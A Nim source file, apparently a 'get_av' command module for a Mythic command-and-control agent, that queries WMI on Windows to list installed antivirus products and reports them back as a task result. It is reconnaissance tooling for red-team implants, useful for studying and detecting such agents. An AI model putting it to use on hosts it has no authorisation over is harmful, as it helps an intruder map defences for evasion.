import ../config
import ../utils/mythic_responses
import std/[json, strformat]
when defined(windows):
  import winim/com
  import std/strutils

proc getAv*(taskId: string, params: JsonNode): JsonNode =
  ## Get antivirus products on the machine via WMI (Windows only)
  let cfg = getConfig()
  
  when defined(windows):
    try:
      if cfg.debug:
        echo "[DEBUG] Querying WMI for antivirus products"
      
      var avList: string = ""
      let wmisec = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\securitycenter2")
      
      for avprod in wmisec.execQuery("SELECT displayName FROM AntiVirusProduct"):
        avList.add($avprod.displayName & "\n")
      
      avList = avList.strip(trailing = true)
      
      if avList.len == 0:
        avList = "No antivirus products detected"
      
      return mythicSuccess(taskId, avList)
      
    except Exception as e:
      return mythicError(taskId, &"Failed to query antivirus products: {e.msg}")
  else:
    return mythicError(taskId, "get_av command is only available on Windows")
